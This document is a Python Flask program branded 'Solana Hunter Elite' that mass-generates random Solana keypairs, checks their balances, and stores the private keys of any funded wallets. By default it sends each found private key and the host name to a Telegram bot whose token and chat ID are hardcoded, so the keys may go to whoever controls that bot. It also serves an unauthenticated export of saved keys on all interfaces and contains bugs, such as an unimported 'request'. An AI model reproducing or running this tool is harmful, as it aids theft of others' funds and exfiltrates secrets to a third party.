import time
import requests
import base58
import nacl.signing
from flask import Flask, render_template_string, jsonify
import threading
import argparse
import webbrowser
import socket
import psutil
from datetime import datetime
import sys
import os
from concurrent.futures import ThreadPoolExecutor

# Configuration
DEFAULT_PORT = 5000
DEFAULT_RPC_URL = "https://api.mainnet-beta.solana.com"
WALLET_FILE = "solana_wallets.txt"
TELEGRAM_TOKEN = "8481417913:AAH65jDSXYt8Z9CKOJW2VwxVG-nuanTe-FE"
TELEGRAM_CHAT_ID = "7521446360"
MAX_WORKERS = 5  # For concurrent balance checking

app = Flask(__name__)
args = None
console_output = []
running = False
generation_thread = None
rpc_url = DEFAULT_RPC_URL
stats = {
    'wallets_generated': 0,
    'wallets_with_balance': 0,
    'start_time': None,
    'last_found': None,
    'avg_speed': 0,
    'success_rate': 100
}

executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)

class EnhancedConsole:
    @staticmethod
    def add(text, color=None):
        timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
        entry = f"[{timestamp}] {text}"
        console_output.append(entry)
        if len(console_output) > 200:
            del console_output[:50]
        
        # Also print to terminal with colors
        color_codes = {
            'red': '\033[91m',
            'green': '\033[92m',
            'yellow': '\033[93m',
            'blue': '\033[94m',
            'magenta': '\033[95m',
            'cyan': '\033[96m',
            'white': '\033[97m',
            'reset': '\033[0m'
        }
        if color in color_codes:
            print(color_codes[color] + entry + color_codes['reset'])
        else:
            print(entry)

def parse_arguments():
    parser = argparse.ArgumentParser(description='Ultimate Solana Wallet Generator')
    parser.add_argument('--port', type=int, default=DEFAULT_PORT, help=f'Port number (default: {DEFAULT_PORT})')
    parser.add_argument('--rpc', type=str, default=DEFAULT_RPC_URL, help=f'Solana RPC endpoint (default: {DEFAULT_RPC_URL})')
    parser.add_argument('--no-browser', action='store_true', help='Disable browser auto-open')
    parser.add_argument('--no-telegram', action='store_true', help='Disable Telegram notifications')
    parser.add_argument('--theme', choices=['dark', 'light', 'cyber', 'pro'], default='pro', help='UI theme selection')
    parser.add_argument('--speed', type=int, default=3, choices=[1, 2, 3, 4, 5], help='Generation speed (1-5)')
    return parser.parse_args()

def get_network_info():
    """Enhanced network information with more details"""
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        interfaces = psutil.net_io_counters(pernic=True)
        cpu_usage = psutil.cpu_percent()
        mem_usage = psutil.virtual_memory().percent
        return {
            'hostname': hostname,
            'ip': ip_address,
            'interfaces': {k: {
                'bytes_sent': v.bytes_sent,
                'bytes_recv': v.bytes_recv
            } for k, v in interfaces.items()},
            'cpu_usage': cpu_usage,
            'mem_usage': mem_usage
        }
    except Exception as e:
        return {'error': str(e)}

def send_telegram_notification(message):
    """Enhanced Telegram notification with rate limiting"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }
        
        response = requests.post(url, json=payload, timeout=10)
        if response.status_code != 200:
            EnhancedConsole.add(f"Telegram error: {response.text}", 'red')
            return False
        return True
    except Exception as e:
        EnhancedConsole.add(f"Telegram connection error: {str(e)}", 'red')
        return False

def generate_solana_address():
    """Optimized wallet generation using caching"""
    try:
        signing_key = nacl.signing.SigningKey.generate()
        verify_key = signing_key.verify_key
        sol_address = base58.b58encode(verify_key.encode()).decode()
        private_key = base58.b58encode(signing_key.encode() + verify_key.encode()).decode()
        return sol_address, private_key
    except Exception as e:
        EnhancedConsole.add(f"Generation error: {str(e)}", 'red')
        return None, None

def check_balance(address):
    """Balance checking with adaptive timeout"""
    payload = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "getBalance",
        "params": [address]
    }
    
    timeout = min(10, max(3, 15 - stats['avg_speed']))  # Adaptive timeout
    
    try:
        start_time = time.time()
        response = requests.post(rpc_url, json=payload, timeout=timeout)
        response_time = (time.time() - start_time) * 1000  # in ms
        
        if response.status_code == 200:
            data = response.json()
            return data.get("result", {}).get("value", 0), response_time
        EnhancedConsole.add(f"RPC Error: {response.text}", 'yellow')
    except requests.exceptions.Timeout:
        EnhancedConsole.add(f"Timeout checking balance for {address[:6]}...", 'yellow')
    except Exception as e:
        EnhancedConsole.add(f"Connection error: {str(e)}", 'yellow')
    
    return None, 0

def process_wallet(address, private_key):
    """Process wallet in a separate thread"""
    balance, response_time = check_balance(address)
    
    if balance is None:
        return False
    
    stats['avg_speed'] = (stats['avg_speed'] * 0.9) + (response_time * 0.1)
    
    sol_balance = balance / 1_000_000_000
    if balance > 0:
        EnhancedConsole.add(f"💰 FOUND: {balance:,} lamports ({sol_balance:.9f} SOL)", 'green')
        save_wallet(address, private_key, balance)
        return True
    else:
        EnhancedConsole.add(f"Balance: {balance:,} lamports (Response: {response_time:.1f}ms)", 'white')
        return False

def save_wallet(address, private_key, balance):
    """Enhanced wallet saving with backup and notification"""
    try:
        # Create backup directory if not exists
        os.makedirs('backups', exist_ok=True)
        
        # Main save
        entry = f"""🚀 SOLANA WALLET FOUND 🚀
Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Address: {address}
Private Key: {private_key}
Balance: {balance:,} lamports ({balance/1_000_000_000:.9f} SOL)
{'='*60}\n"""
        
        with open(WALLET_FILE, 'a') as f:
            f.write(entry)
        
        # Backup save
        backup_file = f"backups/solana_wallets_{datetime.now().strftime('%Y%m%d')}.txt"
        with open(backup_file, 'a') as f:
            f.write(entry)
        
        # Telegram notification
        if not args.no_telegram:
            telegram_msg = f"""💰 <b>SOLANA WALLET FOUND!</b> 💰

⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
📌 <b>Address:</b> <code>{address}</code>
💎 <b>Balance:</b> {balance/1_000_000_000:.9f} SOL

🔑 <b>Private Key:</b>
<code>{private_key}</code>"""
            
            executor.submit(send_telegram_notification, telegram_msg)
        
        stats['wallets_with_balance'] += 1
        stats['last_found'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    except Exception as e:
        EnhancedConsole.add(f"Failed to save wallet: {str(e)}", 'red')

def generation_loop():
    """Optimized generation loop with adaptive speed"""
    stats['start_time'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    last_speed_update = time.time()
    success_count = 0
    total_count = 0
    
    # Speed settings (wallets per second)
    speed_settings = {
        1: 2,
        2: 5,
        3: 10,
        4: 20,
        5: 50
    }
    target_speed = speed_settings.get(args.speed, 10)
    
    while running:
        start_time = time.time()
        
        # Generate and process wallets
        address, private_key = generate_solana_address()
        if not address:
            continue
        
        stats['wallets_generated'] += 1
        total_count += 1
        
        EnhancedConsole.add(f"Generated: {address}", 'cyan')
        EnhancedConsole.add(f"Private: {private_key[:12]}...{private_key[-6:]}", 'yellow')
        
        # Submit balance check to thread pool
        future = executor.submit(process_wallet, address, private_key)
        future.add_done_callback(lambda f: (f.result() and success_count + 1))
        
        # Calculate dynamic delay to maintain target speed
        elapsed = time.time() - start_time
        target_delay = max(0, (1.0 / target_speed) - elapsed)
        time.sleep(target_delay)
        
        # Update success rate periodically
        if time.time() - last_speed_update > 5:
            stats['success_rate'] = (success_count / max(1, total_count)) * 100
            success_count = 0
            total_count = 0
            last_speed_update = time.time()

@app.route('/')
def index():
    """Premium Web Interface with Real-time Monitoring"""
    network_info = get_network_info()
    uptime = str(datetime.now() - datetime.strptime(stats.get('start_time', '0001-01-01 00:00:00'), '%Y-%m-%d %H:%M:%S')).split('.')[0] if stats.get('start_time') else "00:00:00"
    
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Hunter Elite</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        :root {
            --primary-color: #6a11cb;
            --secondary-color: #2575fc;
            --bg-color: #0f0c29;
            --card-bg: #1a1a2e;
            --text-color: #e6f7ff;
            --success-color: #00b894;
            --warning-color: #fdcb6e;
            --danger-color: #d63031;
            --console-bg: #000000;
        }
        
        body {
            font-family: 'JetBrains Mono', monospace, sans-serif;
            background: linear-gradient(135deg, var(--bg-color) 0%, #1a1a2e 100%);
            color: var(--text-color);
            margin: 0;
            padding: 0;
            line-height: 1.6;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
            padding-bottom: 15px;
            border-bottom: 1px solid rgba(var(--secondary-color), 0.3);
        }
        
        h1 {
            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin: 0;
            font-size: 2.5rem;
            letter-spacing: 1.5px;
            font-weight: 800;
        }
        
        .logo {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .dashboard {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 25px;
        }
        
        .stat-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 20px;
            margin-bottom: 25px;
        }
        
        .stat-card {
            background: rgba(var(--card-bg), 0.7);
            border-radius: 12px;
            padding: 20px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
            transition: all 0.3s ease;
        }
        
        .stat-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.3);
        }
        
        .stat-card h3 {
            margin-top: 0;
            margin-bottom: 15px;
            color: var(--secondary-color);
            font-size: 1.1rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .stat-value {
            font-size: 1.8rem;
            font-weight: 800;
            margin: 10px 0;
            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        
        .stat-detail {
            font-size: 0.9rem;
            opacity: 0.8;
        }
        
        .controls {
            display: flex;
            gap: 15px;
            margin-bottom: 25px;
            flex-wrap: wrap;
        }
        
        button {
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            color: white;
            border: none;
            padding: 14px 24px;
            border-radius: 8px;
            cursor: pointer;
            font-family: inherit;
            font-weight: 600;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 10px;
            box-shadow: 0 4px 15px rgba(var(--primary-color), 0.3);
        }
        
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(var(--primary-color), 0.4);
        }
        
        button:disabled {
            background: #555;
            transform: none;
            box-shadow: none;
            cursor: not-allowed;
        }
        
        .status-indicator {
            display: inline-block;
            width: 14px;
            height: 14px;
            border-radius: 50%;
            margin-right: 10px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(0, 255, 0, 0.7); }
            70% { box-shadow: 0 0 0 10px rgba(0, 255, 0, 0); }
            100% { box-shadow: 0 0 0 0 rgba(0, 255, 0, 0); }
        }
        
        .status-running {
            background-color: var(--success-color);
        }
        
        .status-stopped {
            background-color: var(--danger-color);
            animation: none;
        }
        
        .console-container {
            background-color: var(--console-bg);
            border-radius: 12px;
            padding: 20px;
            height: 500px;
            overflow-y: auto;
            margin-bottom: 25px;
            box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.5);
            font-family: 'JetBrains Mono', monospace;
            font-size: 14px;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .console-line {
            margin: 5px 0;
            white-space: pre-wrap;
            word-break: break-word;
            line-height: 1.5;
        }
        
        .timestamp {
            color: #666;
            margin-right: 15px;
        }
        
        .address {
            color: var(--secondary-color);
            font-weight: 600;
        }
        
        .private-key {
            color: var(--warning-color);
            font-family: 'Courier New', monospace;
        }
        
        .balance-positive {
            color: var(--success-color);
            font-weight: 800;
        }
        
        .balance-zero {
            color: #777;
        }
        
        .error {
            color: var(--danger-color);
            font-weight: 600;
        }
        
        .chart-container {
            background: rgba(var(--card-bg), 0.7);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
            height: 300px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        @media (max-width: 1200px) {
            .dashboard {
                grid-template-columns: 1fr;
            }
        }
        
        @media (max-width: 768px) {
            .stat-grid {
                grid-template-columns: 1fr;
            }
            
            .console-container {
                height: 350px;
            }
            
            header {
                flex-direction: column;
                align-items: flex-start;
                gap: 15px;
            }
        }
        
        /* Scrollbar styling */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: rgba(0, 0, 0, 0.2);
            border-radius: 10px;
        }
        
        ::-webkit-scrollbar-thumb {
            background: linear-gradient(var(--primary-color), var(--secondary-color));
            border-radius: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">
                <i class="fas fa-coins" style="font-size: 2.5rem; background: linear-gradient(90deg, var(--primary-color), var(--secondary-color)); -webkit-background-clip: text; background-clip: text; color: transparent;"></i>
                <h1>Solana Hunter Elite</h1>
            </div>
            <div style="display: flex; align-items: center;">
                <span class="status-indicator {% if running %}status-running{% else %}status-stopped{% endif %}"></span>
                <span id="statusText" style="font-weight: 600;">{% if running %}ACTIVE{% else %}STANDBY{% endif %}</span>
            </div>
        </header>
        
        <div class="dashboard">
            <div class="chart-container">
                <canvas id="speedChart"></canvas>
            </div>
            <div class="chart-container">
                <canvas id="successChart"></canvas>
            </div>
        </div>
        
        <div class="stat-grid">
            <div class="stat-card">
                <h3><i class="fas fa-tachometer-alt"></i> Performance</h3>
                <div class="stat-value" id="walletsPerSec">{{ "%.1f"|format(stats['avg_speed']|default(0)) }}</div>
                <div class="stat-detail">Average response time: <span id="avgResponseTime">{{ "%.1f"|format(stats['avg_speed']|default(0)) }}</span> ms</div>
                <div class="stat-detail">Success rate: <span id="successRate">{{ "%.1f"|format(stats['success_rate']|default(100)) }}</span>%</div>
            </div>
            
            <div class="stat-card">
                <h3><i class="fas fa-wallet"></i> Wallets</h3>
                <div class="stat-value" id="walletsGenerated">{{ stats['wallets_generated']|default(0) }}</div>
                <div class="stat-detail">With balance: <span id="walletsWithBalance">{{ stats['wallets_with_balance']|default(0) }}</span></div>
                <div class="stat-detail">Last found: <span id="lastFound">{{ stats['last_found']|default('Never') }}</span></div>
            </div>
            
            <div class="stat-card">
                <h3><i class="fas fa-network-wired"></i> Network</h3>
                <div class="stat-value">{{ network_info['ip'] }}</div>
                <div class="stat-detail">CPU: {{ network_info['cpu_usage']|default('N/A') }}%</div>
                <div class="stat-detail">Memory: {{ network_info['mem_usage']|default('N/A') }}%</div>
            </div>
            
            <div class="stat-card">
                <h3><i class="fas fa-cog"></i> Configuration</h3>
                <div class="stat-value" style="font-size: 1.3rem;">{{ rpc_url|truncate(20, True) }}</div>
                <div class="stat-detail">Speed level: {{ args.speed }}/5</div>
                <div class="stat-detail">Telegram: {% if not args.no_telegram %}<span style="color: var(--success-color);">Enabled</span>{% else %}<span style="color: var(--danger-color);">Disabled</span>{% endif %}</div>
            </div>
        </div>
        
        <div class="controls">
            <button id="startBtn" onclick="startGeneration()">
                <i class="fas fa-play"></i> Start Generation
            </button>
            <button id="stopBtn" onclick="stopGeneration()" {% if not running %}disabled{% endif %}>
                <i class="fas fa-stop"></i> Stop Generation
            </button>
            <button onclick="clearConsole()">
                <i class="fas fa-broom"></i> Clear Console
            </button>
            <button onclick="exportWallets()">
                <i class="fas fa-file-export"></i> Export Wallets
            </button>
            <button onclick="adjustSpeed(1)">
                <i class="fas fa-tachometer-alt"></i> Speed+
            </button>
            <button onclick="adjustSpeed(-1)">
                <i class="fas fa-tachometer-alt"></i> Speed-
            </button>
        </div>
        
        <div class="console-container" id="console">
            <!-- Console output will be inserted here -->
        </div>
    </div>

    <script>
        // Charts initialization
        const speedCtx = document.getElementById('speedChart').getContext('2d');
        const successCtx = document.getElementById('successChart').getContext('2d');
        
        const speedChart = new Chart(speedCtx, {
            type: 'line',
            data: {
                labels: Array(10).fill(''),
                datasets: [{
                    label: 'Response Time (ms)',
                    data: [],
                    borderColor: '#6a11cb',
                    backgroundColor: 'rgba(106, 17, 203, 0.1)',
                    borderWidth: 2,
                    tension: 0.4,
                    fill: true
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: {
                        display: false
                    },
                    title: {
                        display: true,
                        text: 'Network Performance',
                        color: '#e6f7ff'
                    }
                },
                scales: {
                    y: {
                        beginAtZero: true,
                        grid: {
                            color: 'rgba(255, 255, 255, 0.1)'
                        },
                        ticks: {
                            color: '#e6f7ff'
                        }
                    },
                    x: {
                        grid: {
                            display: false
                        },
                        ticks: {
                            display: false
                        }
                    }
                }
            }
        });
        
        const successChart = new Chart(successCtx, {
            type: 'doughnut',
            data: {
                labels: ['Success', 'Failed'],
                datasets: [{
                    data: [100, 0],
                    backgroundColor: [
                        '#00b894',
                        '#d63031'
                    ],
                    borderWidth: 0
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: {
                        position: 'bottom',
                        labels: {
                            color: '#e6f7ff'
                        }
                    },
                    title: {
                        display: true,
                        text: 'Success Rate',
                        color: '#e6f7ff'
                    }
                }
            }
        });
        
        // Update charts with real data
        function updateCharts(responseTime, successRate) {
            // Update speed chart
            if (speedChart.data.datasets[0].data.length >= 10) {
                speedChart.data.datasets[0].data.shift();
            }
            speedChart.data.datasets[0].data.push(responseTime);
            speedChart.update();
            
            // Update success chart
            successChart.data.datasets[0].data = [successRate, 100 - successRate];
            successChart.update();
        }
        
        // Real-time data updates
        function updateStats() {
            fetch('/get_stats')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('walletsGenerated').textContent = data.wallets_generated;
                    document.getElementById('walletsWithBalance').textContent = data.wallets_with_balance;
                    document.getElementById('lastFound').textContent = data.last_found || 'Never';
                    document.getElementById('walletsPerSec').textContent = data.avg_speed.toFixed(1);
                    document.getElementById('avgResponseTime').textContent = data.avg_speed.toFixed(1);
                    document.getElementById('successRate').textContent = data.success_rate.toFixed(1);
                    
                    updateCharts(data.avg_speed, data.success_rate);
                });
        }
        
        function updateConsole() {
            fetch('/get_console')
                .then(response => response.json())
                .then(data => {
                    const consoleElement = document.getElementById('console');
                    let htmlContent = '';
                    
                    data.output.forEach(line => {
                        // Convert color codes to HTML
                        const coloredLine = line
                            .replace(/\[31m/g, '<span class="error">')
                            .replace(/\[32m/g, '<span class="balance-positive">')
                            .replace(/\[33m/g, '<span class="private-key">')
                            .replace(/\[36m/g, '<span class="address">')
                            .replace(/\[0m/g, '</span>')
                            .replace(/\[37m/g, '<span class="balance-zero">');
                        
                        // Extract timestamp
                        const timestampEnd = coloredLine.indexOf(']');
                        const timestamp = coloredLine.substring(0, timestampEnd + 1);
                        const content = coloredLine.substring(timestampEnd + 2);
                        
                        htmlContent += `<div class="console-line"><span class="timestamp">${timestamp}</span>${content}</div>`;
                    });
                    
                    consoleElement.innerHTML = htmlContent;
                    
                    // Auto-scroll if near bottom
                    if (consoleElement.scrollTop > consoleElement.scrollHeight - consoleElement.clientHeight - 100) {
                        consoleElement.scrollTop = consoleElement.scrollHeight;
                    }
                });
        }
        
        function startGeneration() {
            fetch('/start', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        document.getElementById('startBtn').disabled = true;
                        document.getElementById('stopBtn').disabled = false;
                        document.querySelector('.status-indicator').className = 'status-indicator status-running';
                        document.getElementById('statusText').textContent = 'ACTIVE';
                    }
                });
        }
        
        function stopGeneration() {
            fetch('/stop', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        document.getElementById('startBtn').disabled = false;
                        document.getElementById('stopBtn').disabled = true;
                        document.querySelector('.status-indicator').className = 'status-indicator status-stopped';
                        document.getElementById('statusText').textContent = 'STANDBY';
                    }
                });
        }
        
        function clearConsole() {
            fetch('/clear', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        document.getElementById('console').innerHTML = '';
                    }
                });
        }
        
        function exportWallets() {
            fetch('/export_wallets')
                .then(response => response.blob())
                .then(blob => {
                    const url = window.URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = 'solana_wallets_export.txt';
                    document.body.appendChild(a);
                    a.click();
                    window.URL.revokeObjectURL(url);
                });
        }
        
        function adjustSpeed(change) {
            fetch('/adjust_speed', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ change: change })
            }).then(response => response.json())
              .then(data => {
                  if (data.success) {
                      location.reload();
                  }
              });
        }
        
        // Initial update
        updateConsole();
        updateStats();
        
        // Regular updates
        setInterval(updateConsole, 1000);
        setInterval(updateStats, 2000);
    </script>
</body>
</html>
''', rpc_url=rpc_url, port=args.port, wallet_file=WALLET_FILE, 
    no_telegram=args.no_telegram, theme=args.theme, stats=stats,
    network_info=get_network_info())

@app.route('/get_stats')
def get_stats():
    return jsonify(stats)

@app.route('/start', methods=['POST'])
def start_generation():
    global running, generation_thread
    if not running:
        running = True
        generation_thread = threading.Thread(target=generation_loop)
        generation_thread.daemon = True
        generation_thread.start()
        EnhancedConsole.add("🚀 Generation started with optimized settings", 'green')
        if not args.no_telegram:
            send_telegram_notification(
                "🟢 <b>Solana Hunter Elite Activated</b>\n\n"
                f"⚡ Speed Level: {args.speed}/5\n"
                f"🌐 RPC: {rpc_url}\n"
                f"🖥️ Host: {socket.gethostname()}"
            )
        return jsonify({"success": True})
    return jsonify({"success": False, "message": "Already running"})

@app.route('/stop', methods=['POST'])
def stop_generation():
    global running
    if running:
        running = False
        if generation_thread:
            generation_thread.join(timeout=1)
        EnhancedConsole.add("🛑 Generation stopped", 'red')
        if not args.no_telegram:
            send_telegram_notification(
                "🔴 <b>Solana Hunter Elite Stopped</b>\n\n"
                f"📊 Stats:\n"
                f"Generated: {stats['wallets_generated']}\n"
                f"With Balance: {stats['wallets_with_balance']}\n"
                f"Avg Speed: {stats['avg_speed']:.1f} ms"
            )
        return jsonify({"success": True})
    return jsonify({"success": False, "message": "Not running"})

@app.route('/clear', methods=['POST'])
def clear_console():
    global console_output
    console_output = []
    EnhancedConsole.add("🧹 Console cleared", 'blue')
    return jsonify({"success": True})

@app.route('/export_wallets')
def export_wallets():
    try:
        with open(WALLET_FILE, 'r') as f:
            content = f.read()
        return app.response_class(
            content,
            mimetype='text/plain',
            headers={'Content-Disposition': 'attachment;filename=solana_wallets_export.txt'}
        )
    except Exception as e:
        return str(e), 500

@app.route('/adjust_speed', methods=['POST'])
def adjust_speed():
    try:
        change = request.json.get('change', 0)
        new_speed = max(1, min(5, args.speed + change))
        if new_speed != args.speed:
            args.speed = new_speed
            if running:
                EnhancedConsole.add(f"⚡ Speed adjusted to level {args.speed}/5", 'magenta')
            return jsonify({"success": True, "new_speed": args.speed})
        return jsonify({"success": False, "message": "Speed limit reached"})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/get_console')
def get_console():
    return jsonify({"output": console_output})

def signal_handler(sig, frame):
    global running
    if running:
        running = False
        generation_thread.join(timeout=1)
    EnhancedConsole.add("🛑 Application shutdown initiated", 'red')
    sys.exit(0)

if __name__ == '__main__':
    import signal
    signal.signal(signal.SIGINT, signal_handler)
    
    args = parse_arguments()
    rpc_url = args.rpc
    
    # Initial console messages
    EnhancedConsole.add("🌟 Solana Hunter Elite - Premium Edition", 'green')
    EnhancedConsole.add(f"⚙️ Configuration:", 'cyan')
    EnhancedConsole.add(f"  • RPC: {rpc_url}", 'white')
    EnhancedConsole.add(f"  • Speed Level: {args.speed}/5", 'white')
    EnhancedConsole.add(f"  • Theme: {args.theme.capitalize()}", 'white')
    if not args.no_telegram:
        EnhancedConsole.add("  • Telegram: ENABLED", 'magenta')
    else:
        EnhancedConsole.add("  • Telegram: DISABLED", 'yellow')
    EnhancedConsole.add("🔄 Press 'Start Generation' to begin", 'white')
    
    # Open browser if not disabled
    if not args.no_browser:
        webbrowser.open_new_tab(f"http://localhost:{args.port}")
    
    # Start the server with enhanced options
    from waitress import serve
    serve(
        app,
        host='0.0.0.0',
        port=args.port,
        threads=10,
        channel_timeout=10
    )
